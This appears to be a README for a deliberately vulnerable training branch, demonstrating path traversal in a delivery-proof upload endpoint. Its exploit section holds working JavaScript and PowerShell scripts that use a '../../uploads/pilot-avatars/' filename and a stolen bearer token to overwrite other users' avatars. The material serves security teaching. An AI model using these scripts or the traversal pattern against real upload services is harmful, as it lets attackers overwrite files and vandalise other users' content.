# Path Traversal Vulnerability Demo

## Overview

Branch: vulnerability/path-traversal

This branch demonstrates a **Path Traversal** vulnerability in the proof of delivery upload feature. The vulnerability exists in `FileSystemImageRepository.SaveImageCore()` where user-supplied filenames are accepted without proper path normalization and boundary validation. This allows authenticated users to write files to arbitrary locations within the application directory, including overwriting other users' images.

## What is Path Traversal?

Path Traversal (also known as Directory Traversal) is a web security vulnerability that allows attackers to read or write files outside the intended directory. By manipulating file path parameters with sequences like `../` (dot-dot-slash), attackers can traverse up the directory structure and access or modify files they shouldn't have access to.


## Attack Scenario: The Disgruntled Pilot

**Attacker:** Former pilot employee whose account hasn't been disabled
**Motive:** Vandalize rival pilots' profile avatars to damage their reputation
**Method:** Upload proof of delivery with traversal path to overwrite pilot avatars
**Impact:** Customer-facing pilot profiles show inappropriate or embarrassing images

The pilot avatars are stored in `assets/uploads/pilot-avatars/` with filenames like:

- `baloo.webp`
- `hathi.webp`
- `mowgli.webp`
- `raksha.webp`
- `shanti.jpg`

From the protected delivery proof upload directory (`assets/protected/deliveries/`), the traversal path is `../../uploads/pilot-avatars/{target}.webp`

## Exploits

### Javascript (Local Images Only)

This method works for overwriting pilot avatars with images already in the application (avoids MIME validation issues). Run in Browser Console:

```javascript
(async () => {
  const token = localStorage.getItem("mbc_access_token");
  const deliveryId = "YOUR_DELIVERY_ID";
  const targetAvatar = "baloo.webp";

  const imageBlob = await fetch("/assets/sea-plane.webp").then((r) => r.blob());

  const maliciousFile = new File(
    [imageBlob],
    `../../uploads/pilot-avatars/${targetAvatar}`,
    { type: "image/webp" }
  );

  const formData = new FormData();
  formData.append("file", maliciousFile);

  const response = await fetch(
    `http://localhost:5110/api/v1/proofs/deliveries/${deliveryId}/upload`,
    {
      method: "POST",
      headers: { Authorization: `Bearer ${token}` },
      body: formData,
    }
  );

  const result = await response.json();
  console.log("Attack result:", result);

  if (response.ok) {
    console.log("✓ Successfully overwrote pilot avatar!");
    console.log("Navigate to the pilot list to see the vandalized avatar.");
  } else {
    console.error("Attack failed:", result);
  }
})();
```

### PowerShell (Any Image from the Internet)

This method bypasses Content Security Policy and allows uploading any image from the internet. Perfect for using embarrassing external images like [this clown photo](https://upload.wikimedia.org/wikipedia/commons/8/80/Joseph-Grimaldi-head.jpg).

**Step 1:** Get your access token from the browser console:

```javascript
localStorage.getItem("mbc_access_token");
```

**Step 2:** Run this PowerShell script (paste your token and delivery ID):

```powershell
$token = "ACCESS_TOKEN"
$deliveryId = "DELIVERY_ID"
$targetAvatar = "baloo.webp"
$imageUrl = "https://upload.wikimedia.org/wikipedia/commons/8/80/Joseph-Grimaldi-head.jpg"

$tempFile = [System.IO.Path]::GetTempFileName()

try {
    Write-Host "Downloading malicious image from: $imageUrl"
    Invoke-WebRequest -Uri $imageUrl -OutFile $tempFile

    Write-Host "Preparing malicious upload with path traversal..."
    $boundary = [System.Guid]::NewGuid().ToString()
    $fileContent = [System.IO.File]::ReadAllBytes($tempFile)
    $fileName = "../../uploads/pilot-avatars/$targetAvatar"

    $bodyLines = @(
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: image/jpeg",
        "",
        [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($fileContent),
        "--$boundary--"
    )

    $body = $bodyLines -join "`r`n"

    Write-Host "Uploading to delivery: $deliveryId"
    $response = Invoke-RestMethod `
        -Uri "http://localhost:5110/api/v1/proofs/deliveries/$deliveryId/upload" `
        -Method Post `
        -Headers @{
            "Authorization" = "Bearer $token"
            "Content-Type" = "multipart/form-data; boundary=$boundary"
            "Origin" = "http://localhost:4200"
            "Referer" = "http://localhost:4200/"
        } `
        -Body ([System.Text.Encoding]::GetEncoding("iso-8859-1").GetBytes($body))

    Write-Host "✓ Successfully overwrote pilot avatar!" -ForegroundColor Green
    Write-Host "Response: $($response | ConvertTo-Json)"
    Write-Host "Navigate to http://localhost:4200 and check the pilot list!"

} catch {
    Write-Host "✗ Attack failed: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host $_.Exception
} finally {
    Remove-Item $tempFile -ErrorAction SilentlyContinue
}
```

**Alternative targets:**

```powershell
$targetAvatar = "mowgli.webp"
$targetAvatar = "hathi.webp"
$targetAvatar = "raksha.webp"
$targetAvatar = "shanti.jpg"
```

**Other embarrassing images to try:**

```powershell
$imageUrl = "https://upload.wikimedia.org/wikipedia/commons/8/80/Joseph-Grimaldi-head.jpg"
$imageUrl = "https://upload.wikimedia.org/wikipedia/commons/3/3b/Clown_chili_peppers.jpg"
```


## License Note

This vulnerable code is for **educational purposes only**. Never deploy vulnerable code to production environments. This demonstration is designed to teach secure file handling practices through realistic examples.
